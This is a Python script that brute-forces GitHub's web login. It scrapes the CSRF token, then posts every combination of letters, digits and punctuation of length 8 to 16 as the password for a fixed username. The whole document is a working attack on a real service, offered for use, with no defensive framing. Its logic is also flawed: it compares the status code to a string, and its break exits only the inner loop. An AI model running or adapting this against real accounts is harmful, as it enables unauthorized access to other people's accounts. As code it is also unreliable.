import itertools
import string
import requests
from bs4 import BeautifulSoup as bs


def generate_passwords(length):
    characters = string.ascii_letters + string.digits + string.punctuation
    for password_tuple in itertools.product(characters, repeat=length):
        password = ''.join(password_tuple)
        yield password


session = requests.Session()
link = session.get("https://github.com/login")
cookies = session.cookies
soup = bs(link.content, "lxml")
token = soup.find('input', {'name': 'authenticity_token'})["value"]
username = "BruteForceTesting"
password_lengths = list(range(8, 17))
for password_length in password_lengths:
    password_generator = generate_passwords(password_length)

    url = "https://github.com/session"
    for password in password_generator:
        payload = {
            "username": username,
            "password": password,
            "authenticity_token": token,
        }

        response = requests.post(url, data=payload, cookies=cookies)
        if response:
            if response.status_code == "200":
                print(f"Success! Username: {username}, Password: {password}")
                break
